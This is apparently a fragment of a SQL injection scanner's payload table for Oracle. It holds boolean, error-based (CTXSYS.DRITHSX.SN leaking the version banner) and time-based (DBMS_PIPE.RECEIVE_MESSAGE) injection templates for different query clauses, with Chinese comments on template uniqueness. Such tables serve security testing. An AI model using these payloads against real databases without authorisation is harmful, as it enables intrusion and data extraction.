      // 真模板用 (SELECT 'a' FROM dual) 避免与首对真模板 (SELECT 1 FROM dual) 重复（within-clause 唯一约束）
      ["{ORIG},(SELECT 'a' FROM dual)-- -", "{ORIG},(SELECT 1/0 FROM dual)-- -"],
    ],
    error: ["{ORIG},(SELECT CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1)) FROM dual)-- -"],
    time: ["{ORIG},(SELECT DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP}) FROM dual)-- -"],
  },
  groupby: {
    boolean: [
      ["{ORIG} HAVING 1=1-- -", "{ORIG} HAVING 1=2-- -"],
      ["{ORIG}' HAVING '1'='1'-- -", "{ORIG}' HAVING '1'='2'-- -"],
    ],
  },
  having: {
    boolean: [["{ORIG} AND 1=1-- -", "{ORIG} AND 1=2-- -"]],
  },
  // Oracle 无 LIMIT 子句（分页用 ROWNUM，属 WHERE 位）：无 limit 子句变体
  where: {
    boolean: [
      ["{ORIG}') AND 1=1-- -", "{ORIG}') AND 1=2-- -"],
      ["{ORIG}')) AND '1'='1'-- -", "{ORIG}')) AND '1'='2'-- -"],
    ],
  },
};
